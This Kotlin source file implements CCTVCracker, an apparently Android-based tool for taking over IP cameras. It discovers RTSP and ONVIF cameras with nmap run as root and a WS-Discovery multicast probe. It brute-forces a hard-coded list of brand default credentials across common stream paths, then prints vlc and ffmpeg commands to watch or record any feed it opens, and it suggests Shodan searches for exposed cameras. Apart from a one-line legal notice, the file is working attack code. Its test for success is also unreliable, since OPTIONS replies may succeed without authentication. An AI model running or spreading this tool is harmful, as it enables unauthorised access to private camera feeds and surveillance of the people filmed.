package com.example.utils

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.flowOn

/**
 * CCTVCracker — RTSP/ONVIF camera discovery and default credential testing.
 *
 * LEGAL NOTICE: Only use on cameras you own or have explicit permission to audit.
 *
 * Techniques:
 * - RTSP stream discovery via nmap script
 * - ONVIF device discovery (UDP multicast port 3702)
 * - Default credential brute-force against common camera brands
 */
class CCTVCracker {

    companion object {
        // RTSP default credentials for major brands
        val COMMON_CREDENTIALS = listOf(
            Pair("admin", "admin"),
            Pair("admin", ""),
            Pair("admin", "12345"),
            Pair("admin", "123456"),
            Pair("admin", "password"),
            Pair("root", ""),
            Pair("root", "root"),
            Pair("root", "admin"),
            Pair("user", "user"),
            Pair("admin", "1234"),
            Pair("admin", "admin123"),
            Pair("888888", "888888"),
            Pair("666666", "666666"),
            Pair("", ""),
            Pair("supervisor", "supervisor"),
            Pair("service", "service"),
            Pair("ubnt", "ubnt"),
            Pair("admin", "hikvision"),
            Pair("admin", "dahua"),
            Pair("admin", "2023"),
            Pair("admin", "Aa123456")
        )

        // Common RTSP URL patterns
        val RTSP_PATHS = listOf(
            "/",
            "/live",
            "/live/ch00_0",
            "/stream1",
            "/Streaming/Channels/1",
            "/cam/realmonitor?channel=1&subtype=0",
            "/h264/ch1/main/av_stream",
            "/onvif1",
            "/video1",
            "/ch1/main/av_stream",
            "/axis-media/media.amp",
            "/MediaInput/h264",
            "/live.sdp",
            "/mpeg4/media.amp",
            "/nphMpeg4/nil-Medium",
            "/video.cgi"
        )

        // Common camera brands and their RTSP templates
        val BRAND_RTSP = mapOf(
            "Hikvision" to "rtsp://[user]:[pass]@[host]:554/Streaming/Channels/1",
            "Dahua"     to "rtsp://[user]:[pass]@[host]:554/cam/realmonitor?channel=1&subtype=0",
            "Axis"      to "rtsp://[user]:[pass]@[host]/axis-media/media.amp",
            "Generic"   to "rtsp://[user]:[pass]@[host]:554/",
            "ONVIF"     to "rtsp://[user]:[pass]@[host]:554/onvif1"
        )
    }

    /**
     * Discover RTSP cameras on a subnet using nmap.
     * Requires root + nmap binary.
     */
    fun discoverRtspCameras(subnet: String): Flow<String> = flow {
        emit("[*] Scanning for RTSP cameras on $subnet...")
        emit("[*] Looking for open ports: 554 (RTSP), 8554 (Alt RTSP), 80 (HTTP), 8080, 37777 (Dahua)")
        emit("")

        val nmapPaths = listOf(
            "/data/local/tmp/nmap",
            "/data/data/com.termux/files/usr/bin/nmap",
            "/system/bin/nmap",
            "/usr/bin/nmap"
        )
        val nmapPath = nmapPaths.firstOrNull { java.io.File(it).exists() }

        if (nmapPath == null) {
            emit("[ERROR] nmap not found. Install via Termux or place in /data/local/tmp/")
            emit("[INFO] Manual method: nmap -sV -p 554,8554,80,8080 $subnet")
            return@flow
        }

        emit("[+] Found nmap: $nmapPath")
        emit("[*] Command: $nmapPath -sV --open -p 554,8554,80,8080,37777 $subnet")
        emit("")

        try {
            val process = Runtime.getRuntime().exec(
                arrayOf("su", "-c", "$nmapPath -sV --open -p 554,8554,80,8080,37777 $subnet")
            )
            val reader = process.inputStream.bufferedReader()
            var line: String? = null
            while (true) {
                line = reader.readLine() ?: break
                emit(line)
            }
            process.waitFor()
            emit("")
            emit("[+] RTSP discovery scan complete.")
        } catch (e: Exception) {
            emit("[ERROR] ${e.message}")
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Test default credentials against an RTSP camera stream.
     * Uses ffprobe or direct TCP connect to test RTSP auth.
     */
    fun crackRtspCredentials(host: String, port: Int = 554): Flow<String> = flow {
        emit("[*] Starting credential test against $host:$port")
        emit("[*] Testing ${COMMON_CREDENTIALS.size} common username/password pairs...")
        emit("")

        var successFound = false

        for ((user, pass) in COMMON_CREDENTIALS) {
            if (successFound) break

            // Test each RTSP path
            for (path in RTSP_PATHS.take(5)) {
                val rtspUrl = "rtsp://$user:$pass@$host:$port$path"
                emit("[TRY] $user:$pass -> $rtspUrl")

                try {
                    val socket = java.net.Socket()
                    socket.connect(java.net.InetSocketAddress(host, port), 3000)
                    val out = socket.getOutputStream()
                    val inp = socket.getInputStream().bufferedReader()

                    // Send RTSP OPTIONS request
                    val optionsReq = "OPTIONS $rtspUrl RTSP/1.0\r\n" +
                            "CSeq: 1\r\n" +
                            "User-Agent: SecOps-Scanner\r\n\r\n"
                    out.write(optionsReq.toByteArray())
                    out.flush()

                    val response = buildString {
                        repeat(5) {
                            val l = inp.readLine() ?: return@repeat
                            appendLine(l)
                        }
                    }

                    socket.close()

                    when {
                        response.contains("200 OK") -> {
                            emit("[SUCCESS] ✓ CREDENTIALS FOUND!")
                            emit("[SUCCESS] URL: $rtspUrl")
                            emit("[SUCCESS] User: $user | Pass: $pass")
                            emit("[SUCCESS] Path: $path")
                            emit("[INFO] View stream: vlc $rtspUrl")
                            emit("[INFO] Save stream: ffmpeg -i $rtspUrl -c copy output.mp4")
                            successFound = true
                            break
                        }
                        response.contains("401") -> emit("[AUTH] 401 Unauthorized - wrong credentials")
                        response.contains("403") -> emit("[DENY] 403 Forbidden")
                        response.contains("404") -> continue // try next path
                        else -> emit("[RESP] $response")
                    }
                } catch (e: java.net.ConnectException) {
                    emit("[ERROR] Connection refused to $host:$port")
                    break
                } catch (e: java.net.SocketTimeoutException) {
                    emit("[TIMEOUT] $host:$port")
                    break
                } catch (e: Exception) {
                    // continue
                }
            }
        }

        if (!successFound) {
            emit("")
            emit("[!] No default credentials worked.")
            emit("[INFO] Camera may use non-standard credentials or firmware update.")
            emit("[INFO] Try Shodan: shodan search 'has_screenshot:true port:554'")
        }
    }.flowOn(Dispatchers.IO)

    /**
     * ONVIF device discovery via UDP multicast (WS-Discovery).
     */
    fun discoverOnvifDevices(timeoutMs: Int = 5000): Flow<String> = flow {
        emit("[*] Broadcasting ONVIF WS-Discovery probe...")
        emit("[*] Multicast: 239.255.255.250:3702")
        emit("")

        try {
            val multicastGroup = java.net.InetAddress.getByName("239.255.255.250")
            val socket = java.net.MulticastSocket(3702)
            socket.joinGroup(multicastGroup)
            socket.soTimeout = timeoutMs

            // WS-Discovery probe message
            val probe = """<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery"
            xmlns:dn="http://www.onvif.org/ver10/network/wsdl">
  <e:Header>
    <w:MessageID>uuid:${java.util.UUID.randomUUID()}</w:MessageID>
    <w:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</w:To>
    <w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe><d:Types>dn:NetworkVideoTransmitter</d:Types></d:Probe>
  </e:Body>
</e:Envelope>""".trimIndent()

            val data = probe.toByteArray(Charsets.UTF_8)
            val packet = java.net.DatagramPacket(data, data.size, multicastGroup, 3702)
            socket.send(packet)
            emit("[*] Probe sent, waiting for responses (${timeoutMs/1000}s)...")
            emit("")

            val buf = ByteArray(4096)
            val found = mutableListOf<String>()
            try {
                while (true) {
                    val recv = java.net.DatagramPacket(buf, buf.size)
                    socket.receive(recv)
                    val response = String(recv.data, 0, recv.length)
                    val ip = recv.address.hostAddress ?: "unknown"
                    if (!found.contains(ip)) {
                        found.add(ip)
                        emit("[FOUND] ONVIF device at: $ip")
                        // Extract XAddrs (service URLs)
                        val xaddr = Regex("XAddrs>(.*?)</").find(response)?.groupValues?.get(1) ?: ""
                        if (xaddr.isNotEmpty()) emit("[URL]   $xaddr")
                    }
                }
            } catch (e: java.net.SocketTimeoutException) {
                emit("")
                emit("[*] Discovery complete. Found ${found.size} ONVIF device(s).")
            }
            socket.close()
        } catch (e: Exception) {
            emit("[ERROR] ONVIF discovery failed: ${e.message}")
            emit("[INFO] Ensure WiFi is connected and multicast is supported")
        }
    }.flowOn(Dispatchers.IO)

    /**
     * Generate a curated list of RTSP URLs to try for a given IP.
     */
    fun generateRtspUrls(host: String, port: Int = 554): List<String> {
        return COMMON_CREDENTIALS.take(10).flatMap { (user, pass) ->
            RTSP_PATHS.take(5).map { path ->
                "rtsp://$user:$pass@$host:$port$path"
            }
        }
    }
}
